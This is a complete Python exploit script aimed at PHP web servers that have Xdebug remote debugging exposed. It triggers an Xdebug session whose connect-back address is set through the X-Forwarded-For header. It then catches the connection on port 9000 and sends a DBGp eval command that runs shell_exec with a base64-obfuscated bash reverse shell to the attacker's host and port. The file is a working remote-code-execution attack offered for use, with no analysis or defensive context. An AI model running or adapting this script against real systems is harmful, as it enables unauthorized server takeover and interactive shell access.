#!/usr/bin/env python3

import os
import pipes
import requests
import sys
import socket
import threading

from base64 import b64encode as b64e

if len(sys.argv) != 4:
    print(f'Usage: python3 {sys.argv[0]} <url> <lhost> <lport>')


def start_xdebug(url, lhost):
    try:
        requests.get(url, timeout=2,
                     params={'XDEBUG_SESSION_START': os.urandom(8).hex()},
                     headers={'X-Forwarded-For': lhost})
    except requests.exceptions.ReadTimeout:
        pass


def main():
    url, lhost, lport = sys.argv[1:4]

    rev_shell = b64e(f'bash  -i >& /dev/tcp/{lhost}/{lport} 0>&1'.encode())
    command = f'echo {rev_shell.decode()} | base64 -d | bash'
    php_command = b64e(f'shell_exec({pipes.quote(command)})'.encode())

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', 9000))
        s.listen(1)

        threading.Thread(target=start_xdebug, args=(url, lhost)).start()

        conn, _ = s.accept()
        conn.recv(1024)
        conn.sendall(f'eval -i 1 -- {php_command.decode()}\0'.encode())
        conn.close()


if __name__ == '__main__':
    main()
